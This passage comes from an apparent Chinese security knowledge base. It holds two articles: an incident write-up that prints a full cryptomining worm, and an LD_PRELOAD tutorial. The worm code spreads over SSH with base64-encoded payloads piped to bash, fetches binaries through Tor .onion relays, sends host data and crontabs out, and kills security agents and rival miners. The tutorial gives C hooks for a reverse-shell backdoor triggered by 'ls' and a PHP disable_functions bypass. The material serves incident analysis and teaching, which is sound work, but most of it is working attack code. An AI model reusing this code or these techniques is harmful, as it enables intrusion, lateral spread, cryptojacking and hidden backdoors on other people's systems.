\"\\b([0-9]{1,3}\\.){3}[0-9]{1,3}\\b\" ~/.bash_history /etc/hosts ~/.ssh/known_hosts |grep -v ^127.|awk -F: {'print $2'}|sort|uniq) for h in $hosts do ssh -oBatchMode=yes -oConnectTimeout=5 -oPasswordAuthentication=no -oPubkeyAuthentication=yes -oStrictHostKeyChecking=no -l root $h 'echo UVg1d3NLMG5OYzNsckF3RnFYWEk3Q0NpaEFab21FVm9pdHR4STRua1BjSDhQV2VWOEgvakt4ejlSOHRKbmtLSwpleGVjICY+L2Rldi9udWxsCmV4cG9ydCBQQVRIPSRQQVRIOiRIT01FOi9iaW46L3NiaW46L3Vzci9iaW46L3Vzci9zYmluOi91c3IvbG9jYWwvYmluOi91c3IvbG9jYWwvc2JpbgoKZD0kKGdyZXAgeDokKGlkIC11KTogL2V0Yy9wYXNzd2R8Y3V0IC1kOiAtZjYpCmM9JChlY2hvICJjdXJsIC00ZnNTTGtBLSAtbTIwMCIpCnQ9JChlY2hvICI0azZqdGE0enJ3em03dTU0YW0zdm5qcG5sdmxidWp5dnJ0cHJ5dGY0c2Ntcnc3dTN1ZG1ncWFxZCIpCgpzb2NreigpIHsKbj0oZG9oLmRlZmF1bHRyb3V0ZXMuZGUgZG5zLmhvc3R1eC5uZXQgZG5zLmRucy1vdmVyLWh0dHBzLmNvbSB1bmNlbnNvcmVkLmx1eDEuZG5zLm5peG5ldC54eXogZG5zLnJ1YnlmaXNoLmNuIGRucy50d25pYy50dyBkb2guY2VudHJhbGV1LnBpLWRucy5jb20gZG9oLmRucy5zYiBkb2gtZmkuYmxhaGRucy5jb20gZmkuZG9oLmRucy5zbm9weXRhLm9yZyBkbnMuZmxhdHVzbGlmaXIuaXMgZG9oLmxpIGRucy5kaWdpdGFsZS1nZXNlbGxzY2hhZnQuY2gpCnA9JChlY2hvICJkbnMtcXVlcnk/bmFtZT1yZWxheS50b3Iyc29ja3MuaW4iKQpzPSQoJGMgaHR0cHM6Ly8ke25bJCgoUkFORE9NJTEzKSldfS8kcCB8IGdyZXAgLW9FICJcYihbMC05XXsxLDN9XC4pezN9WzAtOV17MSwzfVxiIiB8dHIgJyAnICdcbid8c29ydCAtdVJ8aGVhZCAtMSkKfQoKZmV4ZSgpIHsKZm9yIGkgaW4gL2Rldi9zaG0gL3Vzci9iaW4gJGQgL3RtcCAvdmFyL3RtcCA7ZG8gZWNobyBleGl0ID4gJGkvaSAmJiBjaG1vZCAreCAkaS9pICYmIGNkICRpICYmIC4vaSAmJiBybSAtZiBpICYmIGJyZWFrO2RvbmUKfQoKdSgpIHsKc29ja3oKZmV4ZQpmPS9pbnQuJCh1bmFtZSAtbSkKeD0uLyQoZGF0ZXxtZDVzdW18Y3V0IC1mMSAtZC0pCnI9JChjdXJsIC00ZnNTTGsgY2hlY2tpcC5hbWF6b25hd3MuY29tfHxjdXJsIC00ZnNTTGsgaXAuc2IpXyQod2hvYW1pKV8kKHVuYW1lIC1tKV8kKHVuYW1lIC1uKV8kKGlwIGF8Z3JlcCAnaW5ldCAnfGF3ayB7J3ByaW50ICQyJ318bWQ1c3VtfGF3ayB7J3ByaW50ICQxJ30pXyQoY3JvbnRhYiAtbHxiYXNlNjQgLXcwKQokYyAteCBzb2NrczVoOi8vJHM6OTA1MCAkdC5vbmlvbiRmIC1vJHggLWUkciB8fCAkYyAkMSRmIC1vJHggLWUkcgpjaG1vZCAreCAkeDskeDtybSAtZiAkeAp9Cgpmb3IgaCBpbiB0b3Iyd2ViLmluIHRvcjJ3ZWIuaW8gdG9yMndlYi5zdSBvbmlvbi5jb20uZGUgdG9yMndlYi50byBvbmlvbi5zaApkbwppZiAhIGxzIC9wcm9jLyQoaGVhZCAtMSAvdG1wLy5YMTEtdW5peC8wMSkvc3RhdHVzOyB0aGVuCnUgJHQuJGgKZWxzZQpicmVhawpmaQpkb25lCg==|base64 -d|bash' # ssh -o BatchMode=yes(将不会显示交互式口令输入) -o ConnectTimeout=5(超时时间5s) -o PasswordAuthentication=no(不使用密码认证) -o PubkeyAuthentication=yes (使用公钥认证) -o StrictHostKeyChecking=no (不记录远程主机的公钥到knows_hosts) -l root (登录名为root) $h(ip) 'echo xxx'(植入程序，下载挖矿程序代码，并执行) done # 以当前用户名登录内网机器 for h in $hosts;do ssh -oBatchMode=yes -oConnectTimeout=5 -oPasswordAuthentication=no -oPubkeyAuthentication=yes -oStrictHostKeyChecking=no -l $USER $h 'echo UVg1d3NLMG5OYzNsckF3RnFYWEk3Q0NpaEFab21FVm9pdHR4STRua1BjSDhQV2VWOEgvakt4ejlSOHRKbmtLSwpleGVjICY+L2Rldi9udWxsCmV4cG9ydCBQQVRIPSRQQVRIOiRIT01FOi9iaW46L3NiaW46L3Vzci9iaW46L3Vzci9zYmluOi91c3IvbG9jYWwvYmluOi91c3IvbG9jYWwvc2JpbgoKZD0kKGdyZXAgeDokKGlkIC11KTogL2V0Yy9wYXNzd2R8Y3V0IC1kOiAtZjYpCmM9JChlY2hvICJjdXJsIC00ZnNTTGtBLSAtbTIwMCIpCnQ9JChlY2hvICI0azZqdGE0enJ3em03dTU0YW0zdm5qcG5sdmxidWp5dnJ0cHJ5dGY0c2Ntcnc3dTN1ZG1ncWFxZCIpCgpzb2NreigpIHsKbj0oZG9oLmRlZmF1bHRyb3V0ZXMuZGUgZG5zLmhvc3R1eC5uZXQgZG5zLmRucy1vdmVyLWh0dHBzLmNvbSB1bmNlbnNvcmVkLmx1eDEuZG5zLm5peG5ldC54eXogZG5zLnJ1YnlmaXNoLmNuIGRucy50d25pYy50dyBkb2guY2VudHJhbGV1LnBpLWRucy5jb20gZG9oLmRucy5zYiBkb2gtZmkuYmxhaGRucy5jb20gZmkuZG9oLmRucy5zbm9weXRhLm9yZyBkbnMuZmxhdHVzbGlmaXIuaXMgZG9oLmxpIGRucy5kaWdpdGFsZS1nZXNlbGxzY2hhZnQuY2gpCnA9JChlY2hvICJkbnMtcXVlcnk/bmFtZT1yZWxheS50b3Iyc29ja3MuaW4iKQpzPSQoJGMgaHR0cHM6Ly8ke25bJCgoUkFORE9NJTEzKSldfS8kcCB8IGdyZXAgLW9FICJcYihbMC05XXsxLDN9XC4pezN9WzAtOV17MSwzfVxiIiB8dHIgJyAnICdcbid8c29ydCAtdVJ8aGVhZCAtMSkKfQoKZmV4ZSgpIHsKZm9yIGkgaW4gL2Rldi9zaG0gL3Vzci9iaW4gJGQgL3RtcCAvdmFyL3RtcCA7ZG8gZWNobyBleGl0ID4gJGkvaSAmJiBjaG1vZCAreCAkaS9pICYmIGNkICRpICYmIC4vaSAmJiBybSAtZiBpICYmIGJyZWFrO2RvbmUKfQoKdSgpIHsKc29ja3oKZmV4ZQpmPS9pbnQuJCh1bmFtZSAtbSkKeD0uLyQoZGF0ZXxtZDVzdW18Y3V0IC1mMSAtZC0pCnI9JChjdXJsIC00ZnNTTGsgY2hlY2tpcC5hbWF6b25hd3MuY29tfHxjdXJsIC00ZnNTTGsgaXAuc2IpXyQod2hvYW1pKV8kKHVuYW1lIC1tKV8kKHVuYW1lIC1uKV8kKGlwIGF8Z3JlcCAnaW5ldCAnfGF3ayB7J3ByaW50ICQyJ318bWQ1c3VtfGF3ayB7J3ByaW50ICQxJ30pXyQoY3JvbnRhYiAtbHxiYXNlNjQgLXcwKQokYyAteCBzb2NrczVoOi8vJHM6OTA1MCAkdC5vbmlvbiRmIC1vJHggLWUkciB8fCAkYyAkMSRmIC1vJHggLWUkcgpjaG1vZCAreCAkeDskeDtybSAtZiAkeAp9Cgpmb3IgaCBpbiB0b3Iyd2ViLmluIHRvcjJ3ZWIuaW8gdG9yMndlYi5zdSBvbmlvbi5jb20uZGUgdG9yMndlYi50byBvbmlvbi5zaApkbwppZiAhIGxzIC9wcm9jLyQoaGVhZCAtMSAvdG1wLy5YMTEtdW5peC8wMSkvc3RhdHVzOyB0aGVuCnUgJHQuJGgKZWxzZQpicmVhawpmaQpkb25lCg==|base64 -d|bash';done } ibot() { f=/bot # r 是输出本机相关信息及计划任务作为字符串拼接 r=$(curl -4fsSLk ip.sb||wget -4qO- ip.sb||curl -4fsSLk checkip.amazonaws.com)_$(whoami)_$(uname -m)_$(uname -n)_$(crontab -l|base64 -w0) # curl -x socks5h://$s:9050 -e 下载脚本 $c -x socks5h://$s:9050 -e$r $t.onion$f || $c -e$r $1$f } iscn() { # pkill -9 -f 删除tracepath进程 pkill -9 -f tracepath # $f 字符串 f=/trc # $x 时间md5格式化字符串 x=./$(date|md5sum|cut -f1 -d-) # 下载脚本 $c -x socks5h://$s:9050 $t.onion$f -o$x || $c $1$f -o$x # 添加x权限，执行，删除 chmod +x $x;$x;rm -f $x } # dns解析 sockz # fexe # 下载curl，cron等 isys # 内网投毒，并在该机器上下载脚本执行 issh & ibot $t.tor2web.in || ibot $t.tor2web.io || ibot $t.tor2web.su || iscn $t.onion.com.de || iscn $t.onion.sh iscn $t.tor2web.in || iscn $t.tor2web.io || iscn $t.tor2web.su || iscn $t.onion.com.de || iscn $t.onion.sh QX5wsK0nNc3lrAwFqXXI7CCihAZomEVoittxI4nkPcH8PWeV8H/jKxz9R8tJnkKK exec &>/dev/null export PATH=$PATH:$HOME:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin find /etc/cron*|xargs chattr -i find /var/spool/cron*|xargs chattr -i crontab -l |grep -ivE \"70OXQG|Malware|Miner|VUses5|\\-unix|\\.\\/oka|\\.configrc|\\.rsync|\\/upd|aliyun|basht|bffbe|curl|jqu\\.js|kill_virus|kpccv|malware|mazec|nullc|qcloud|rvlss|ryukd|systemd-init|th2ps|titanagent|tmp00|ucxin|unixdb|unixoa|wget|wlvly|xzfix\" |crontab - crontab -l ;grep -iRE \"70OXQG|Malware|Miner|VUses5|\\-unix|\\.\\/oka|\\.configrc|\\.rsync|\\/upd|aliyun|basht|bffbe|curl|jqu\\.js|kill_virus|kpccv|malware|mazec|nullc|qcloud|rvlss|ryukd|systemd-init|th2ps|titanagent|tmp00|ucxin|unixdb|unixoa|wget|wlvly|xzfix\" /etc/cron.*|cut -f 1 -d :|xargs rm -f rm -f $HOME/.{kpccv,xzfix,th2ps,bffbe,rvlss,wlvly,ucxin,mazec,ryukd,unixdb,unixoa,aliyun,70OXQG,titanagent,VUses5}.sh rm -f /opt/{kpccv,xzfix,th2ps,bffbe,rvlss,wlvly,ucxin,mazec,ryukd,unixdb,unixoa,aliyun,70OXQG,titanagent,VUses5}.sh rm -f /etc/cron.d/0{kpccv,xzfix,th2ps,bffbe,rvlss,wlvly,ucxin,mazec,ryukd,unixdb,unixoa,aliyun,70OXQG,titanagent,VUses5} rm -f /root/killMiner.sh /opt/killMiner.sh /home/kill_virus.sh /root/fixMalwareTemp.sh /root/.killer pkill -9 -f \"./cron|./oka|\\-unix|/tmp/ddgs|/tmp/idk|/tmp/java|/tmp/keep|/tmp/udevs|/tmp/udk|/tmp/update.sh|/tmp/yarn|/usr/bin/netfs|8220|AliHids|AliYunDun|descargars|Donald|HT8s|Jonason|steasec|salt-store|salt-minion|SzdXM|X13-unix|X17-unix|\\[stea\\]|aegis_|AliYunDun|AliHids|AliHips|AliYunDunUpdatealiyun-service|azipl|bash64|bigd1ck|cr.sh|crloger|cronds|crun|cryptonight|curn|currn|ddgs|dhcleint|fs-manager|gf128mul|havegeds|httpdz|irqbalanced|java-c|kaudited|kdevtmpfsi|kerberods|khugepageds|kinsing|kintegrityds|kpsmouseds|kswaped|kthreadds|kthrotlds|kw0|kworkerds|kworkre|kwroker|lsof|lopata|Macron|mewrs|migrations|miner|mmm|mr.sh|muhsti|mygit|netdns|networkservice|orgfs|pamdicks|pastebin|qW3xT|qwefdas|rctlcli|sleep|stratum|sustes|sustse|sysguard|sysguerd|systeamd|systemd-network|sysupdate|sysupdata|t00ls|thisxxs|Trump|update.sh|vTtHH|watchbog|watchbug|watchog|wipefs|wnTKYg|x3Wq|xig|xmr|zer0\" netstat -antp|grep -E \"103.3.62.64|104.140.201.42|104.140.244.186|107.178.104.10|107.191.99.221|107.191.99.95|116.203.73.240|131.153.56.98|131.153.76.130|136.243.102.154|138.201.20.89|138.201.27.243|138.201.36.249|139.162.132.70|139.162.60.220|139.162.81.90|139.99.101.197|139.99.101.198|139.99.101.232|139.99.102.70|139.99.102.71|139.99.102.72|139.99.102.73|139.99.102.74|139.99.120.50|139.99.120.75|139.99.123.196|139.99.124.170|139.99.125.38|139.99.156.30|139.99.68.128|142.44.242.100|142.44.243.6|144.217.14.109|144.217.14.139|147.135.37.31|149.202.42.174|149.202.83.171|15.236.100.141|151.80.144.188|158.69.25.62|158.69.25.71|158.69.25.77|163.172.203.178|163.172.206.67|163.172.207.69|163.172.226.114|163.172.226.137|172.104.143.224|172.104.151.232|172.104.159.158|172.104.165.191|172.104.247.21|172.104.76.21|172.105.205.58|172.105.205.68|172.105.210.117|172.105.211.250|172.105.235.97|178.63.100.197|18.180.72.219|18.210.126.40|192.110.160.114|192.99.69.170|195.154.62.247|195.201.12.107|199.231.85.124|207.246.100.198|213.32.29.143|213.32.74.157|217.182.169.148|23.88.160.140|3.0.193.200|37.187.95.110|37.59.43.131|37.59.44.193|37.59.44.93|37.59.54.205|37.59.55.60|37.9.3.26|45.32.71.82|45.76.65.223|45.79.192.137|45.79.200.97|45.79.204.241|45.79.210.48|46.4.120.18|47.101.30.124|5.196.13.29|5.196.23.240|51.15.54.102|51.15.55.100|51.15.55.162|51.15.58.224|51.15.65.182|51.15.67.17|51.15.69.136|51.15.78.68|51.255.34.118|51.255.34.79|51.255.34.80|51.81.245.40|54.188.223.206|54.37.7.208|66.42.105.146|78.46.49.222|78.46.87.181|81.25.55.79|81.91.189.245|88.99.142.163|88.99.193.240|88.99.242.92|91.121.140.167|94.130.12.27|94.130.12.30|94.130.143.162|94.130.165.85|94.130.165.87|94.130.239.15|94.23.23.52|94.23.247.226|95.216.209.67|205.185.118.204|63.250.33.43|185.199.11|139.99.121.227|199.192.30.2\"|awk {'print $NF'} |cut -d/ -f1|xargs kill -9 ss -antp |grep -E \"103.3.62.64|104.140.201.42|104.140.244.186|107.178.104.10|107.191.99.221|107.191.99.95|116.203.73.240|131.153.56.98|131.153.76.130|136.243.102.154|138.201.20.89|138.201.27.243|138.201.36.249|139.162.132.70|139.162.60.220|139.162.81.90|139.99.101.197|139.99.101.198|139.99.101.232|139.99.102.70|139.99.102.71|139.99.102.72|139.99.102.73|139.99.102.74|139.99.120.50|139.99.120.75|139.99.123.196|139.99.124.170|139.99.125.38|139.99.156.30|139.99.68.128|142.44.242.100|142.44.243.6|144.217.14.109|144.217.14.139|147.135.37.31|149.202.42.174|149.202.83.171|15.236.100.141|151.80.144.188|158.69.25.62|158.69.25.71|158.69.25.77|163.172.203.178|163.172.206.67|163.172.207.69|163.172.226.114|163.172.226.137|172.104.143.224|172.104.151.232|172.104.159.158|172.104.165.191|172.104.247.21|172.104.76.21|172.105.205.58|172.105.205.68|172.105.210.117|172.105.211.250|172.105.235.97|178.63.100.197|18.180.72.219|18.210.126.40|192.110.160.114|192.99.69.170|195.154.62.247|195.201.12.107|199.231.85.124|207.246.100.198|213.32.29.143|213.32.74.157|217.182.169.148|23.88.160.140|3.0.193.200|37.187.95.110|37.59.43.131|37.59.44.193|37.59.44.93|37.59.54.205|37.59.55.60|37.9.3.26|45.32.71.82|45.76.65.223|45.79.192.137|45.79.200.97|45.79.204.241|45.79.210.48|46.4.120.18|47.101.30.124|5.196.13.29|5.196.23.240|51.15.54.102|51.15.55.100|51.15.55.162|51.15.58.224|51.15.65.182|51.15.67.17|51.15.69.136|51.15.78.68|51.255.34.118|51.255.34.79|51.255.34.80|51.81.245.40|54.188.223.206|54.37.7.208|66.42.105.146|78.46.49.222|78.46.87.181|81.25.55.79|81.91.189.245|88.99.142.163|88.99.193.240|88.99.242.92|91.121.140.167|94.130.12.27|94.130.12.30|94.130.143.162|94.130.165.85|94.130.165.87|94.130.239.15|94.23.23.52|94.23.247.226|95.216.209.67|205.185.118.204|63.250.33.43|185.199.11|139.99.121.227|199.192.30.2\" |awk -F, {'print $2'}|sed 's/pid=//g' |xargs kill -9 chattr -i /etc/hosts grep -q onion /etc/hosts && sed -i '/onion/d' /etc/hosts grep -q tor2w /etc/hosts && sed -i '/tor2w/d' /etc/hosts grep -R /tmp/.X11-unix /root/*|cut -d: -f1|xargs rm -f grep -R /tmp/.X11-unix /opt/*|cut -d: -f1|xargs rm -f QX5wsK0nNc3lrAwFqXXI7CCihAZomEVoittxI4nkPcH8PWeV8H/jKxz9R8tJnkKK exec &>/dev/null export PATH=$PATH:$HOME:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin d=$(grep x:$(id -u): /etc/passwd|cut -d: -f6) c=$(echo \"curl -4fsSLkA- -m200\") t=$(echo \"4k6jta4zrwzm7u54am3vnjpnlvlbujyvrtprytf4scmrw7u3udmgqaqd\") sockz() { n=(doh.defaultroutes.de dns.hostux.net dns.dns-over-https.com uncensored.lux1.dns.nixnet.xyz dns.rubyfish.cn dns.twnic.tw doh.centraleu.pi-dns.com doh.dns.sb doh-fi.blahdns.com fi.doh.dns.snopyta.org dns.flatuslifir.is doh.li dns.digitale-gesellschaft.ch) p=$(echo \"dns-query?name=relay.tor2socks.in\") s=$($c https://${n[$((RANDOM%13))]}/$p | grep -oE \"\\b([0-9]{1,3}\\.){3}[0-9]{1,3}\\b\" |tr ' ' '\\n'|sort -uR|head -1) } fexe() { for i in /dev/shm /usr/bin $d /tmp /var/tmp ;do echo exit > $i/i && chmod +x $i/i && cd $i && ./i && rm -f i && break;done } u() { sockz fexe f=/cpu x=./$(date|md5sum|cut -f1 -d-) $c -x socks5h://$s:9050 $t.onion$f -o$x || $c $1$f -o$x chmod +x $x;$x;rm -f $x } for h in tor2web.in tor2web.su tor2web.io tor2web.to onion.sh onion.com.de do if ! ls /proc/$(head -1 /tmp/.X11-unix/11)/maps; then u $t.$h else break fi done QX5wsK0nNc3lrAwFqXXI7CCihAZomEVoittxI4nkPcH8PWeV8H/jKxz9R8tJnkKK exec &>/dev/null export PATH=$PATH:$HOME:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin d=$(grep x:$(id -u): /etc/passwd|cut -d: -f6) c=$(echo \"curl -4fsSLkA- -m200\") t=$(echo \"4k6jta4zrwzm7u54am3vnjpnlvlbujyvrtprytf4scmrw7u3udmgqaqd\") sockz() { n=(doh.defaultroutes.de dns.hostux.net dns.dns-over-https.com uncensored.lux1.dns.nixnet.xyz dns.rubyfish.cn dns.twnic.tw doh.centraleu.pi-dns.com doh.dns.sb doh-fi.blahdns.com fi.doh.dns.snopyta.org dns.flatuslifir.is doh.li dns.digitale-gesellschaft.ch) p=$(echo \"dns-query?name=relay.tor2socks.in\") s=$($c https://${n[$((RANDOM%13))]}/$p | grep -oE \"\\b([0-9]{1,3}\\.){3}[0-9]{1,3}\\b\" |tr ' ' '\\n'|sort -uR|head -1) } u() { sockz f=/cmd $c -x socks5h://$s:9050 $t.onion$f || $c $1$f } ( u $t.tor2web.in || u $t.tor2web.io || u $t.tor2web.su || u $t.onion.com.de || u $t.onion.sh || u $t.tor2web.to )|bash QX5wsK0nNc3lrAwFqXXI7CCihAZomEVoittxI4nkPcH8PWeV8H/jKxz9R8tJnkKK exec &>/dev/null export PATH=$PATH:$HOME:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin d=$(grep x:$(id -u): /etc/passwd|cut -d: -f6) c=$(echo \"curl -4sSLkA- -m200\") t=$(echo \"4k6jta4zrwzm7u54am3vnjpnlvlbujyvrtprytf4scmrw7u3udmgqaqd\") sockz() { n=(doh.defaultroutes.de dns.hostux.net dns.dns-over-https.com uncensored.lux1.dns.nixnet.xyz dns.rubyfish.cn dns.twnic.tw doh.centraleu.pi-dns.com doh.dns.sb doh-fi.blahdns.com fi.doh.dns.snopyta.org dns.flatuslifir.is doh.li dns.digitale-gesellschaft.ch) p=$(echo \"dns-query?name=relay.tor2socks.in\") s=$($c https://${n[$((RANDOM%13))]}/$p | grep -oE \"\\b([0-9]{1,3}\\.){3}[0-9]{1,3}\\b\" |tr ' ' '\\n'|sort -uR|head -1) } ibot() { sockz f=/bot r=$(curl -4fsSLk checkip.amazonaws.com||curl -4fsSLk ip.sb)_$(whoami)_$(uname -m)_$(uname -n)_$(ip a|grep 'inet '|awk {'print $2'}|md5sum|awk {'print $1'})_$(crontab -l|base64 -w0) $c -X POST -x socks5h://$s:9050 -e$r $t.onion$f || $c -X POST -e$r $1$f } ibot $t.tor2web.in || ibot $t.tor2web.io || ibot $t.tor2web.su || ibot $t.onion.com.de || ibot $t.tor2web.to || ibot $t.onion.sh QX5wsK0nNc3lrAwFqXXI7CCihAZomEVoittxI4nkPcH8PWeV8H/jKxz9R8tJnkKK chattr -i /tmp/.X11-unix chattr -Ri /tmp/.X11-unix [ -f /tmp/.X11-unix ] && rm -f /tmp/.X11-unix [ -d /tmp/.X11-unix ] || mkdir -p /tmp/.X11-unix 应急过程 卸载curl命令，防止外连，先降低cpu（脚本未使用 wget，apt，yum 等下载curl，而是使用本机的curl去执行动作） 椒图查看进程 -> 无果（当时未发现恶意进程） 椒图查看日志 -> 发现了恶意的进程，但是pid都执行完就给删除了，在服务器里未查询到执行生成病毒文件，定时任务的pid和文件 椒图扫描恶意二进制文件 -> 发现恶意的二进制文件（已被删除）,但进程还存在（椒图给报了） 查看该进程的内存块，使用gdb attch ${pid}，发现确实有删除文件的那一段内存，dump memory进程地址，只有第一段内存能dump下来，（删除文件那段内存已经不存在了），dump下第一段内存，发现了执行内容（base64编码），全部解码发现不能解码成功，但是发现有多处|base64 -d|，挨个解码发现，发现了该病毒注入到内存 ，所以清理不掉 重启服务器 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-07-13 15:13:03 "},"知识库/03.主机安全/22.LD PRELOAD深入浅出.html":{"url":"知识库/03.主机安全/22.LD PRELOAD深入浅出.html","title":"22.LD PRELOAD深入浅出","keywords":"","body":"简介 程序的链接有如下三种： 静态链接：在程序运行之前先将各个目标模块以及所需要的库函数链接成一个完整的可执行程序，之后不再拆开 装入时动态链接：源程序编译后所得到的一组目标模块，在装入内存时，边装入边链接 运行时动态链接：原程序编译后得到的目标模块，在程序执行过程中需要用到时才对它进行链接 对于动态链接来说活，需要一个动态链接库，其作用在于当动态库的函数发生变化对于壳执行程序来说是透明的，可执行程序无需重新编译，方便程序的发布/维护/更新。但是由于程序是在运行时动态加载，这就存在一个问题，当需要动态加载的函数是恶意的，就有可能导致一些非于其的执行结果，或者绕过某些安全设置(如 Linux 环境下，绕过PHP的disable_functions) 我们这里着重讨论运行时动态链接 LD_PRELOAD LD_PRELOAD 是 Linux 系统中的一个环境变量，它可以影响程序的运行时的链接（Runtime linker），它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。一方面，我们可以以此功能来使用自己的或是更好的函数（无需别人的源码），而另一方面，我们也可以以向别人的程序注入程序，从而达到特定的目的。 LD_PRELOAD is an optional environmental variable containing one or more paths to shared libraries, or shared objects, that the loader will load before any other shared library including the C runtime library (libc.so) This is called preloading a library. LD_PRELOAD Hook 由于 LD_PRELOAD 可以指定在程序运行前优先加载的动态链接库，那我们可以重写程序运行过程中所调用的函数并编译成动态链接库文件，然后通过指定 LD_PRELOAD 让程序优先加载的这个恶意的动态链接库，最后当程序再次运行时便会加载动态链接库中的恶意函数。具体的操作步骤如下： 定义与目标函数完全一样的函数，包括名称、变量及类型、返回值及类型等 将包含替换函数的源码编译为动态链接库。 通过命令 export LD_PRELOAD=\"库文件路径\"，设置要优先替换动态链接库即可。 替换结束，要还原函数调用关系，用命令unset LD_PRELOAD 解除 在这里我通过一个简单的实例来进行演示 // passwordCheck.c #include #include int main(int argc, char **argv) { char passwd[] = \"password\"; if (argc \\n\", argv[0]); return 0; } if (!strcmp(passwd, argv[1])) { printf(\"\\033[0;32;32mPassword Correct!\\n\\033[m\"); return 1; } else { printf(\"\\033[0;32;31mPassword Wrong!\\n\\033[m\"); return 0; } } // 编译生成可执行文件 gcc passwordCheck.c -o passwordCheck 可以看到当输入正确的密码返回的是 Password Correct，密码错误则返回 Password Wrong。这其中用到了标准C函数strcmp函数来做比较，这是一个外部调用函数。下面我们尝试重新编写一个与strcmp同名的函数，并编译成动态链接库，实现劫持原函数的功能。 //hook_strcmp.c #include #include int strcmp(const char *s1, const char *s2){ if(getenv(\"LD_PRELOAD\") == NULL){ return 0; } unsetenv(\"LD_PRELOAD\"); return 0; } [!TIPS] 由于我们通过 LD_PRELOAD 劫持了函数，劫持后启动了一个新进程，若不在新进程启动前取消 LD_PRELOAD，则将陷入无限循环，所以必须得删除环境变量 LD_PRELOAD，最直观的做法是调用 unsetenv(\"LD_PRELOAD\") 执行命令编译生成hook_strcmp.so gcc -shared -fPIC hook_strcmp.c -o hook_strcmp.so 然后通过环境变量 LD_PRELOAD 来设置 hook_strcmp.so 能被其他调用它的程序优先加载 此时我们便成功劫持了原程序 passwordcheck 中的 strcmp 函数。 利用LD_PRELOAD Hook 系统命令并制作后门 当我们得知了一个系统命令所调用的库函数 后，我们可以重写指定的库函数进行劫持。这里我们以 ls 命令为例进行演示。 首先查看 ls 这一系统命令会调用哪些库函数 whereis ls readelf -Ws /usr/bin/ls 如上图所示可以看到很多库函数，我们随便选择一个合适的进行重写即可，这里我选择的是 strncmp： // hook_strncmp.c #include #include #include void payload() { system(\"id\"); } int strncmp(const char *__s1, const char *__s2, size_t __n) { // 这里函数的定义可以根据报错信息进行确定 if (getenv(\"LD_PRELOAD\") == NULL) { return 0; } unsetenv(\"LD_PRELOAD\"); payload(); } gcc -shared -fPIC hook_strncmp.c -o hook_strncmp.so 然后通过环境变量 LD_PRELOAD 来设置 hook_strncmp.so 能被其他调用它的程序优先加载： export LD_PRELOAD=$PWD/hook_strncmp.so 最后执行ls发现会优先执行hook_strncmp.so库中的strncmp函数 ，这时就会调用system(\"id\");方法，此时成功劫持了 strncmp 函数。 利用这种思路，我们可以制作一个隐藏的 Linux 后门，比如当管理员执行 ls 命令时会反弹一个 Shell： // hook_strncmp.c #include #include #include void payload() { system(\"bash -c 'bash -i >& /dev/tcp/192.168.93.128/8888 0>&1'\"); } int strncmp(const char *__s1, const char *__s2, size_t __n) { // 这里函数的定义可以根据报错信息进行确定 if (getenv(\"LD_PRELOAD\") == NULL) { return 0; } unsetenv(\"LD_PRELOAD\"); payload(); } 然后将其写入.bash_profile或者.bashrc中 # .bash_profile start export LD_PRELOAD=\"\" # .bash_profile end # env start source ~/.bash_profile # or source ~/bashrc # env end ls PHP bypass Disable_Functions 当php.ini中设置了disable_functions，表示php不支持以下函数的调用，那么危险的执行系统命令的函数将不可用，这时需要可以在内部启动一个新的进程，在该进程中通过使用环境变量LD_PRELOAD劫持系统函数，让外部程序加载恶意动态链接库文件，从而达到命令执行的效果 基于这一思路，将突破 disable_functions 限制执行操作系统命令这一目标，大致分解成以下几个步骤： 查看进程调用的系统函数明细 找寻内部可以启动新进程的 PHP 函数 找到这个新进程所调用的系统库函数并重写 PHP 环境下劫持系统函数注入代码 虽然 LD_PRELOAD 提供了劫持系统函数的能力，但前提是得控制 PHP 启动外部程序才行，并且只要有进程启动行为即可，无所谓是谁。所以我们要寻找内部可以启动新进程的 PHP 函数。运行 PHP 的 mail() 函数，mail() 内部启动新进程 /usr/sbin/sendmail，由于 LD_PRELOAD 的作用，sendmail 调用的系统函数 geteuid() 被优先级更好的 geteuid_shadow.so 中的同名 geteuid() 所劫持。 C(so) #define _GNU_SOURCE #include #include #include extern char** environ; int geteuid () { const char* cmdline = \"whoami > /var/www/html/test.txt\"; int i; for (i = 0; environ[i]; ++i) { if (strstr(environ[i], \"LD_PRELOAD\")) { environ[i][0] = '\\0'; } } system(cmdline); } php 分别将动态库test.so文件，php脚本test.php上传到服务器中，再访问test.php脚本文件，如果成功将geteuid函数劫持，那么将会把whoami命令结果重定向在/var/www/html/test.txt文件中 利用 LD_PRELOAD 劫持系统新进程来绕过 在真实环境中，存在两方面问题：一是，某些环境中，web 禁止启用 sendmail、甚至系统上根本未安装 sendmail，也就谈不上劫持 getuid()，通常的 www-data 权限又不可能去更改 php.ini 配置、去安装 sendmail 软件；二是，即便目标可以启用 sendmail，由于未将主机名（hostname 输出）添加进 hosts 中，导致每次运行 sendmail 都要耗时半分钟等待域名解析超时返回，www-data 也无法将主机名加入 hosts（如，127.0.0.1 lamp、lamp.、lamp.com）。基于这两个原因，不得不放弃劫持函数 geteuid()，必须找个更实用的方法。回到 LD_PRELOAD 本身，系统通过它预先加载共享对象，如果能找到一个方式，在加载时就执行代码，而不用考虑劫持某一系统函数，那就完全可以不依赖 sendmail 了。 GCC 有个 C 语言扩展修饰符 attribute((constructor))，可以让由它修饰的函数在 main() 之前执行，若它出现在共享对象中时，那么一旦共享对象被系统加载，立即将执行 attribute((constructor)) 修饰的函数。这一细节非常重要，很多朋友用 LD_PRELOAD 手法突破 disable_functions 无法做到百分百成功，正因为这个原因，不要局限于仅劫持某一函数，而应考虑拦劫启动进程这一行为。 此外，通过 LD_PRELOAD 劫持了启动进程的行为，劫持后又启动了另外的新进程，若不在新进程启动前取消 LD_PRELOAD，则将陷入无限循环，所以必须得删除环境变量 LD_PRELOAD。最直观的做法是调用 unsetenv(\"LD_PRELOAD\")，这在大部份 linux 发行套件上的确可行，但在 centos 上却无效，究其原因，centos 自己也 hook 了 unsetenv()，在其内部启动了其他进程，根本来不及删除 LD_PRELOAD 